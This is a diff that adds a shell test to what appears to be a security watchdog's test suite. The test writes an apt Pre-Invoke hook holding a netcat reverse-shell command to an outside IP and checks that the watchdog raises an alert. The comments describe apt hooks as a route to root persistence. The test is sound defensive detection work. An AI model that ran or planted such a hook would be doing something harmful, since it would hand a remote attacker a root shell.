@@ -266,3 +266,18 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (nc reverse-shell variant in apt hook command: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
+    # Sister to sshrc/csh-config/logrotate/systemd-power-hooks/
+    # dhclient-hooks/bash-completion/anacrontab nc reverse-shell
+    # variant INVARIANTs across the brain. Lock the netcat axis
+    # on package-transaction-triggered root code execution surface
+    # (T1546 — DPkg::Pre-Invoke fires hook AS ROOT around every apt
+    # operation).
+    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${HOOK}"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf 'DPkg::Pre-Invoke {"nc -e /bin/sh 1.1.1.1 4444";};\n' > "${HOOK}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
